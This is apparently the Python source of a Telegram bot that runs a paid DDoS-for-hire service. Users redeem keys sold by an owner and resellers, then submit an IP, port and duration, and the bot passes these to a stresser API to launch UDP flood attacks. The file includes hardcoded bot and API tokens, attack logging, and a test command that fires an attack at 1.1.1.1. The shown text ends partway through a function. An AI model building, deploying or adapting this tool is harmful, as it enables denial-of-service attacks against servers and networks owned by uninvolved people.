#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪
Owner: 1987818347
"""

import logging
import os
import re
import json
import random
import string
import asyncio
from datetime import datetime, timedelta
import time
import requests

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
BOT_OWNER = 1987818347

BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"
BOT_START_TIME = datetime.now()

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [], "videos": [], "pyf_videos": [],
        "settings": {
            "max_attack_time": 300,
            "user_cooldown": 30,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL,
            "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD,
            "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    return d
        except:
            pass
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except:
        pass

data = load_data()

# ============= RANDOM ROTATION =============
_sticker_pool = []
_video_pool = []
_pyf_pool = []

def get_random_sticker():
    global _sticker_pool
    stickers = data.get("stickers", [])
    if not stickers: return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy()
        random.shuffle(_sticker_pool)
    return _sticker_pool.pop()

def get_random_video():
    global _video_pool
    videos = data.get("videos", [])
    if not videos: return None
    if not _video_pool:
        _video_pool = videos.copy()
        random.shuffle(_video_pool)
    return _video_pool.pop()

def get_random_pyf():
    global _pyf_pool
    pyfs = data.get("pyf_videos", [])
    if not pyfs: return None
    if not _pyf_pool:
        _pyf_pool = pyfs.copy()
        random.shuffle(_pyf_pool)
    return _pyf_pool.pop()

# ============= HELPERS =============
def is_owner(uid): return uid == BOT_OWNER or str(uid) in data["admins"]
def is_reseller(uid):
    r = data["resellers"].get(str(uid))
    return r is not None and not r.get('blocked', False)
def is_banned(uid): return str(uid) in data["banned_users"]
def get_setting(k, d=None): return data["settings"].get(k, d)
def set_setting(k, v):
    data["settings"][k] = v
    save_data(data)

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    if is_owner(uid) or is_reseller(uid): return True
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return False
    try: return datetime.now() <= datetime.fromisoformat(u['key_expiry'])
    except: return False

def time_remaining(uid):
    if is_owner(uid): return "Unlimited (Owner)"
    if is_reseller(uid): return "Unlimited (Reseller)"
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return "No Key"
    try:
        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
        if rem.total_seconds() <= 0: return "Expired"
        d = rem.days; h, r = divmod(rem.seconds, 3600); m, _ = divmod(r, 60)
        return f"{d}d {h}h {m}m"
    except: return "Error"

user_cooldown = {}
active_attacks = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0: return int(r)
        del user_cooldown[uid]
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 30)
    if cd > 0: user_cooldown[uid] = time.time() + cd

def is_attack_running():
    now = datetime.now()
    for aid, atk in list(active_attacks.items()):
        if atk['end_time'] <= now: del active_attacks[aid]
    return len(active_attacks) > 0

def ist_now():
    return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')

def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        resp = requests.get(req, timeout=10)
        if resp.status_code == 200: return True, resp.text
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        return False, str(e)

# ============= INLINE KEYBOARDS =============
def ikb_main(uid):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔥 ATTACK", callback_data="cmd_attack", style="danger"),
            InlineKeyboardButton("📊 STATUS", callback_data="cmd_status", style="success"),
        ],
        [
            InlineKeyboardButton("👤 PROFILE", callback_data="cmd_profile", style="primary"),
            InlineKeyboardButton("👑 OWNER PANEL", callback_data="cmd_panel", style="danger"),
        ],
    ])

def ikb_user(uid):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔥 ATTACK", callback_data="cmd_attack", style="danger"),
            InlineKeyboardButton("📊 STATUS", callback_data="cmd_status", style="success"),
        ],
        [
            InlineKeyboardButton("🔑 REDEEM", callback_data="cmd_redeem", style="primary"),
            InlineKeyboardButton("👤 PROFILE", callback_data="cmd_profile", style="primary"),
        ],
    ])

def ikb_no_key():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔑 REDEEM", callback_data="cmd_redeem", style="primary"),
            InlineKeyboardButton("👤 PROFILE", callback_data="cmd_profile", style="primary"),
        ],
    ])

def ikb_owner():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔑 GEN KEY", callback_data="cmd_genkey", style="primary"),
            InlineKeyboardButton("👥 USERS", callback_data="cmd_users", style="success"),
        ],
        [
            InlineKeyboardButton("📊 STATS", callback_data="cmd_stats", style="primary"),
            InlineKeyboardButton("📢 BROADCAST", callback_data="cmd_broadcast", style="danger"),
        ],
        [
            InlineKeyboardButton("⚙️ SETTINGS", callback_data="cmd_settings", style="primary"),
            InlineKeyboardButton("❌ CLOSE", callback_data="cmd_close", style="danger"),
        ],
    ])

# ============= START COMMAND =============
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    if is_banned(uid):
        await msg.reply_text("🚫 You are banned.")
        return

    name = msg.from_user.first_name or "User"
    username = msg.from_user.username
    cid = msg.chat.id

    # ===== CHECKING ANIMATION =====
    check_text = (
        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n"
        "⏳ Starting..."
    )

    chosen_pyf_start = get_random_pyf()
    if chosen_pyf_start:
        try:
            check = await context.bot.send_video(cid, chosen_pyf_start, caption=check_text, parse_mode="HTML")
        except:
            check = await context.bot.send_message(cid, check_text, parse_mode="HTML")
    else:
        check = await context.bot.send_message(cid, check_text, parse_mode="HTML")

    steps = [
        ("▰▱▱▱▱▱▱▱▱▱", "10%", "📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲𝗿..."),
        ("▰▰▰▱▱▱▱▱▱▱", "30%", "👤 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐮𝐬𝐞𝐫..."),
        ("▰▰▰▰▰▱▱▱▱▱", "50%", "⚙️ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙥𝙧𝙤𝙛𝙞𝙡𝙚..."),
        ("▰▰▰▰▰▰▰▱▱▱", "70%", "🔑 ᴄʜᴇᴄᴋɪɴɢ ᴋᴇʏ ꜱᴛᴀᴛᴜꜱ..."),
        ("▰▰▰▰▰▰▰▰▰▱", "90%", "⏳ 𝘍𝘪𝘯𝘢𝘭𝘪𝘻𝘪𝘯𝘨..."),
        ("▰▰▰▰▰▰▰▰▰▰", "100%", "✅ Ｖｅｒｉｆｉｅｄ!"),
    ]

    for bar, pct, status in steps:
        await asyncio.sleep(0.7)
        try:
            await context.bot.edit_message_caption(
                chat_id=cid, message_id=check.message_id,
                caption=(
                    "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                    "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                    "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                    f"{bar} {pct}\n{status}"
                ),
                parse_mode="HTML"
            )
        except:
            try:
                await context.bot.edit_message_text(
                    chat_id=cid, message_id=check.message_id,
                    text=(
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        f"{bar} {pct}\n{status}"
                    ),
                    parse_mode="HTML"
                )
            except:
                pass

    await asyncio.sleep(0.8)

    is_new = str(uid) not in data["users"]
    if is_new:
        data["users"][str(uid)] = {
            "username": username or name,
            "joined_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "key_expiry": None
        }
        save_data(data)

    has_key = has_valid_key(uid)
    time_left = time_remaining(uid)

    try:
        await context.bot.delete_message(cid, check.message_id)
    except: pass

    # ===== STICKER → 5 SEC → FINAL MSG → 1 SEC → DELETE =====
    sticker_msg = None
    chosen_sticker = get_random_sticker()
    if chosen_sticker:
        try:
            sticker_msg = await context.bot.send_sticker(cid, chosen_sticker)
            await asyncio.sleep(5)
        except Exception as e:
            print(f"Sticker Error: {e}")

    # ===== FINAL MESSAGE =====
    header = (
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
        f"┊         {BOT_NAME}              ┊\n"
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
    )

    if is_new and not has_key:
        text = header + (
            f"\n👋 <b>Welcome, {name}!</b>\n\n"
            "🎉 Aapka account successfully create ho gaya!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>Status:</b> No Active Key\n"
            f"🎯 <b>Method:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            "⚡ <b>Bot:</b> 🟢 ONLINE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>Kaise Start Kare?</b>\n\n"
            "1️⃣ <b>Redeem Key</b> ➤ <code>/redeem YOUR-KEY</code>\n"
            "2️⃣ <b>Launch Attack</b> ➤ <code>/attack IP PORT TIME</code>\n"
            "3️⃣ <b>Check Profile</b> ➤ <code>/profile</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>Bina key ke attack nahi lagega!</b>\n"
            "🔑 Key lene ke liye owner se contact karo.\n"
            "━━━━━━━━━━━━━━━━━━━━━"
        )
        kb = ikb_no_key()
    elif has_key:
        u = data["users"].get(str(uid), {})
        total_attacks = u.get("total_attacks", 0)
        role = "👑 OWNER" if is_owner(uid) else ("💼 RESELLER" if is_reseller(uid) else "👤 USER")

        text = header + (
            f"\n👋 <b>Welcome back, {name}!</b>\n\n"
            "✅ <b>Key Verified Successfully</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Role:</b> {role}\n"
            f"🆔 <b>ID:</b> <code>{uid}</code>\n"
            f"⏰ <b>Time Left:</b> <b>{time_left}</b>\n"
            f"🎯 <b>Total Attacks:</b> {total_attacks}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔥 <b>Ready to launch attack?</b>"
        )
        kb = ikb_main(uid) if is_owner(uid) else ikb_user(uid)
    else:
        text = header + (
            f"\n👋 <b>Welcome back, {name}!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>Status:</b> No Active Key\n"
            f"🎯 <b>Method:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            "⚡ <b>Bot:</b> 🟢 ONLINE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ <b>Aapki key expire ho gayi hai</b>\n"
            "ya abhi tak redeem nahi ki!\n\n"
            "📌 <b>Key Redeem Karo:</b> <code>/redeem YOUR-KEY</code>\n\n"
            "🔑 Naya key lene ke liye owner se contact karo.\n"
            "━━━━━━━━━━━━━━━━━━━━━"
        )
        kb = ikb_no_key()

    try:
        await context.bot.send_message(cid, text, reply_markup=kb, parse_mode="HTML")
    except Exception as e:
        print(f"❌ Final message error: {e}")
        await context.bot.send_message(cid, text, parse_mode="HTML")

    if sticker_msg:
        await asyncio.sleep(1)
        try:
            await context.bot.delete_message(cid, sticker_msg.message_id)
        except:
            pass

# ============= CALLBACK HANDLER =============
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    cid = query.message.chat.id
    msg_id = query.message.message_id

    if query.data == "cmd_attack":
        await context.bot.send_message(cid, "🎯 Use: <code>/attack IP PORT TIME</code>", parse_mode="HTML")
    elif query.data == "cmd_status":
        now = datetime.now()
        running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]
        txt = (
            f"📊 <b>STATUS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 Bot: <b>ONLINE</b>\n"
            f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>\n"
            f"👥 Users: <b>{len(data['users'])}</b>\n"
            f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
        )
        if running:
            for a, atk in running:
                rem = int((atk['end_time'] - now).total_seconds())
                txt += f"⚔️ {atk['target']}:{atk['port']} ({rem}s)\n"
        else:
            txt += "💤 No active attacks"
        await context.bot.send_message(cid, txt, parse_mode="HTML")
    elif query.data == "cmd_profile":
        u = data["users"].get(str(uid), {})
        txt = (
            f"👤 <b>PROFILE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: <code>{uid}</code>\n"
            f"⏰ Time: <b>{time_remaining(uid)}</b>\n"
            f"🎯 Attacks: <b>{u.get('total_attacks', 0)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(cid, txt, parse_mode="HTML")
    elif query.data == "cmd_panel":
        if not is_owner(uid):
            await query.answer("❌ Owner only!", show_alert=True); return
        await context.bot.edit_message_reply_markup(cid, msg_id, reply_markup=ikb_owner())
    elif query.data == "cmd_redeem":
        await context.bot.send_message(cid, "🔑 Use: <code>/redeem YOUR-KEY</code>", parse_mode="HTML")
    elif query.data == "cmd_genkey":
        await context.bot.send_message(cid, "🔑 Use: <code>/genkey DAYS AMOUNT</code>", parse_mode="HTML")
    elif query.data == "cmd_users":
        if not is_owner(uid):
            await query.answer("❌ Owner only!", show_alert=True); return
        if not data["users"]:
            await context.bot.send_message(cid, "📂 No users."); return
        txt = "👥 <b>USERS</b>\n━━━━━━━━━━━━━\n"
        for i, (u_id, u) in enumerate(list(data["users"].items())[:50], 1):
            txt += f"{i}. <code>{u_id}</code> | {u.get('total_attacks', 0)} attacks\n"
        await context.bot.send_message(cid, txt, parse_mode="HTML")
    elif query.data == "cmd_stats":
        if not is_owner(uid):
            await query.answer("❌ Owner only!", show_alert=True); return
        txt = (
            f"📊 <b>STATS</b>\n"
            f"👥 Users: <b>{len(data['users'])}</b>\n"
            f"🔑 Keys: <b>{len(data['keys'])}</b>\n"
            f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
            f"❄ Stickers: <b>{len(data.get('stickers', []))}</b>\n"
            f"📹 Videos: <b>{len(data.get('videos', []))}</b>\n"
            f"🎬 PYF Videos: <b>{len(data.get('pyf_videos', []))}</b>\n"
            f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>"
        )
        await context.bot.send_message(cid, txt, parse_mode="HTML")
    elif query.data == "cmd_broadcast":
        await context.bot.send_message(cid, "📢 Use: <code>/broadcast MESSAGE</code>", parse_mode="HTML")
    elif query.data == "cmd_settings":
        if not is_owner(uid):
            await query.answer("❌ Owner only!", show_alert=True); return
        txt = (
            "⚙️ <b>ALL COMMANDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👑 <b>OWNER</b>\n/panel /users /stats /broadcast /ban /unban\n\n"
            "🔑 <b>KEY</b>\n/genkey DAYS [AMOUNT]\n/redeem KEY\n\n"
            "📡 <b>API</b>\n/setapi URL TOKEN [method] [geo]\n/testapi\n/setmaxtime SEC\n/setcooldown SEC\n\n"
            "🔧 <b>BOT</b>\n/maintenance\n\n"
            "❄ <b>STICKER</b>\nSend = Auto Add\n/removesticker NUMBER\n/liststickers\n\n"
            "📹 <b>VIDEO</b>\nSend = Auto Add\n/listvideo\n/delvideo NUMBER\n\n"
            "🎬 <b>PYF VIDEO</b>\n/addpyf\n/listpyf\n/delpyf NUMBER"
        )
        await context.bot.send_message(cid, txt, parse_mode="HTML")
    elif query.data == "cmd_close":
        try:
            await context.bot.delete_message(cid, msg_id)
        except: pass
    elif query.data.startswith("delsticker_"):
        if not is_owner(uid): return
        try:
            idx = int(query.data.split("_")[1])
            data["stickers"].pop(idx)
            save_data(data)
            await query.answer(f"✅ Removed! Total: {len(data['stickers'])}")
        except:
            await query.answer("❌ Error!")
    elif query.data.startswith("delvideo_"):
        if not is_owner(uid): return
        try:
            idx = int(query.data.split("_")[1])
            data["videos"].pop(idx)
            save_data(data)
            await query.answer(f"✅ Removed! Total: {len(data['videos'])}")
        except:
            await query.answer("❌ Error!")
    elif query.data.startswith("delpyf_"):
        if not is_owner(uid): return
        try:
            idx = int(query.data.split("_")[1])
            data["pyf_videos"].pop(idx)
            save_data(data)
            await query.answer(f"✅ Removed! Total: {len(data['pyf_videos'])}")
        except:
            await query.answer("❌ Error!")

# ============= ATTACK =============
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    if is_banned(uid): return
    cid = msg.chat.id

    if get_setting('maintenance_mode', False) and not is_owner(uid):
        await msg.reply_text(f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return

    if not is_owner(uid) and not has_valid_key(uid):
        await msg.reply_text("⚠️ No active key! /redeem first."); return

    parts = msg.text.split()[1:]
    if len(parts) != 3:
        await msg.reply_text("❌ <b>Usage:</b> <code>/attack IP PORT TIME</code>", parse_mode="HTML"); return

    ip, ps, ds = parts
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await msg.reply_text("❌ Invalid IP!"); return

    try:
        port = int(ps); dur = int(ds)
        if not (1 <= port <= 65535): await msg.reply_text("❌ Port 1-65535!"); return
        if dur < 1: await msg.reply_text("❌ Min 1s!"); return
        if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
            await msg.reply_text(f"❌ Max {get_setting('max_attack_time', 300)}s!"); return
    except:
        await msg.reply_text("❌ Invalid port/time!"); return

    cd = get_cd_remaining(uid)
    if cd > 0 and not is_owner(uid):
        await msg.reply_text(f"⏸️ Cooldown: {cd}s"); return

    if is_attack_running():
        await msg.reply_text("❌ Attack already running!"); return

    set_cd(uid)
    name = msg.from_user.username or f"User_{uid}"

    ok, r = api_attack(ip, port, dur)
    if not ok:
        await msg.reply_text(f"❌ <b>FAILED</b>\n<code>{r[:300]}</code>", parse_mode="HTML"); return

    attack_caption = (
        f"💀 <b>ATTACK LAUNCHED</b> 💀\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: <b>@{name}</b>\n"
        f"🎯 Target: <code>{ip}:{port}</code>\n"
        f"⏱️ Duration: <b>{dur}s</b>\n"
        f"🚀 Method: <b>{get_setting('api_method', 'UDP-BIG')}</b>\n"
        f"📅 Started: <b>{ist_now()} IST</b>"
    )

    chosen_video = get_random_video()
    if chosen_video:
        try:
            await context.bot.send_video(cid, chosen_video, caption=attack_caption, parse_mode="HTML")
        except Exception as e:
            await msg.reply_text(attack_caption, parse_mode="HTML")
    else:
        await msg.reply_text(attack_caption, parse_mode="HTML")

    data["attack_logs"].append({
        'user_id': uid, 'username': name, 'target': ip, 'port': port,
        'duration': dur, 'timestamp': datetime.now().isoformat()
    })
    save_data(data)

    aid = f"{uid}_{time.time()}"
    active_attacks[aid] = {
        'target': ip, 'port': port,
        'end_time': datetime.now() + timedelta(seconds=dur)
    }

    async def done():
        await asyncio.sleep(dur)
        active_attacks.pop(aid, None)
        complete_caption = f"✅ <b>ATTACK COMPLETE</b>\n🎯 {ip}:{port} | {dur}s"
        chosen_video_done = get_random_video()
        if chosen_video_done:
            try:
                await context.bot.send_video(cid, chosen_video_done, caption=complete_caption, parse_mode="HTML")
            except:
                try:
                    await context.bot.send_message(cid, complete_caption, parse_mode="HTML")
                except: pass
        else:
            try:
                await context.bot.send_message(cid, complete_caption, parse_mode="HTML")
            except: pass

    asyncio.create_task(done())

# ============= KEY MANAGEMENT =============
async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        await msg.reply_text("⚠️ <code>/genkey DAYS [AMOUNT]</code>", parse_mode="HTML"); return
    try:
        days = int(p[1]); amt = int(p[2]) if len(p) > 2 else 1
    except:
        await msg.reply_text("❌ Invalid!"); return

    keys = []
    for _ in range(amt):
        raw = gen_key(16); formatted = fmt_key(raw)
        data["keys"][formatted] = {
            "days": days, "created_at": datetime.now().isoformat(),
            "used": False, "used_by": None
        }
        keys.append(formatted)
    save_data(data)

    txt = f"✅ <b>Generated {amt} Key(s)</b>\n━━━━━━━━━━━━━\n"
    for k in keys: txt += f"<code>{k}</code>\n"
    txt += f"━━━━━━━━━━━━━\n⏰ Duration: <b>{days} days</b>"
    await msg.reply_text(txt, parse_mode="HTML")

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    if is_banned(uid): return
    p = msg.text.split()
    if len(p) < 2:
        await msg.reply_text("⚠️ <code>/redeem KEY</code>", parse_mode="HTML"); return
    key = p[1].strip().upper()
    if key not in data["keys"]:
        await msg.reply_text("❌ Invalid key!"); return
    kinfo = data["keys"][key]
    if kinfo.get("used"):
        await msg.reply_text("❌ Already used!"); return

    days = kinfo["days"]
    expiry = datetime.now() + timedelta(days=days)
    data["users"].setdefault(str(uid), {})
    existing = data["users"][str(uid)].get("key_expiry")
    if existing:
        try:
            old_exp = datetime.fromisoformat(existing)
            if old_exp > datetime.now():
                expiry = old_exp + timedelta(days=days)
        except: pass
    data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
    data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
    kinfo["used"] = True; kinfo["used_by"] = uid
    kinfo["used_at"] = datetime.now().isoformat()
    save_data(data)
    await msg.reply_text(f"✅ <b>KEY REDEEMED!</b>\n⏰ +{days} days\n📅 Expires: <b>{expiry.strftime('%d %b %Y')}</b>", parse_mode="HTML")

# ============= PROFILE / STATUS =============
async def cmd_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    u = data["users"].get(str(uid), {})
    txt = (
        f"👤 <b>PROFILE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"📛 Name: <b>{msg.from_user.first_name}</b>\n"
        f"⏰ Time: <b>{time_remaining(uid)}</b>\n"
        f"🎯 Attacks: <b>{u.get('total_attacks', 0)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    await msg.reply_text(txt, parse_mode="HTML")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    now = datetime.now()
    running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]
    txt = (
        f"📊 <b>STATUS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot: <b>ONLINE</b>\n"
        f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>\n"
        f"👥 Users: <b>{len(data['users'])}</b>\n"
        f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
    )
    if running:
        for a, atk in running:
            rem = int((atk['end_time'] - now).total_seconds())
            txt += f"⚔️ {atk['target']}:{atk['port']} ({rem}s)\n"
    else:
        txt += "💤 No active attacks"
    await msg.reply_text(txt, parse_mode="HTML")

# ============= OWNER COMMANDS =============
async def cmd_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    await msg.reply_text("👑 <b>OWNER PANEL</b>", reply_markup=ikb_owner(), parse_mode="HTML")

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["users"]:
        await msg.reply_text("📂 No users."); return
    txt = "👥 <b>USERS</b>\n━━━━━━━━━━━━━\n"
    for i, (uid, u) in enumerate(list(data["users"].items())[:50], 1):
        txt += f"{i}. <code>{uid}</code> | {u.get('total_attacks', 0)} attacks\n"
    await msg.reply_text(txt, parse_mode="HTML")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split(maxsplit=1)
    if len(p) < 2:
        await msg.reply_text("⚠️ /broadcast MSG"); return
    text = p[1]; sent = 0
    for uid in data["users"]:
        try:
            await context.bot.send_message(int(uid), f"📢 <b>BROADCAST</b>\n\n{text}", parse_mode="HTML")
            sent += 1
        except: pass
    await msg.reply_text(f"✅ Sent to {sent} users.")

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    txt = (
        f"📊 <b>STATS</b>\n"
        f"👥 Users: <b>{len(data['users'])}</b>\n"
        f"🔑 Keys: <b>{len(data['keys'])}</b>\n"
        f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
        f"❄ Stickers: <b>{len(data.get('stickers', []))}</b>\n"
        f"📹 Videos: <b>{len(data.get('videos', []))}</b>\n"
        f"🎬 PYF Videos: <b>{len(data.get('pyf_videos', []))}</b>\n"
        f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>"
    )
    await msg.reply_text(txt, parse_mode="HTML")

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: await msg.reply_text("⚠️ /ban ID"); return
    data["banned_users"][p[1]] = datetime.now().isoformat()
    save_data(data); await msg.reply_text(f"✅ Banned {p[1]}")

async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: await msg.reply_text("⚠️ /unban ID"); return
    if p[1] in data["banned_users"]:
        del data["banned_users"][p[1]]; save_data(data)
        await msg.reply_text("✅ Unbanned")
    else: await msg.reply_text("❌ Not banned")

async def cmd_setapi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 3: await msg.reply_text("⚠️ /setapi URL TOKEN"); return
    set_setting("api_url", p[1]); set_setting("api_token", p[2])
    if len(p) > 3: set_setting("api_method", p[3])
    if len(p) > 4: set_setting("api_geolocation", p[4])
    await msg.reply_text("✅ API Updated!")

async def cmd_testapi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    ok, r = api_attack("1.1.1.1", 80, 5)
    if ok: await msg.reply_text(f"✅ <b>API OK</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
    else: await msg.reply_text(f"❌ <b>API FAILED</b>\n<code>{r[:300]}</code>", parse_mode="HTML")

async def cmd_setmaxtime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: await msg.reply_text("⚠️ /setmaxtime SEC"); return
    set_setting("max_attack_time", int(p[1]))
    await msg.reply_text(f"✅ Max: {p[1]}s")

async def cmd_setcooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: await msg.reply_text("⚠️ /setcooldown SEC"); return
    set_setting("user_cooldown", int(p[1]))
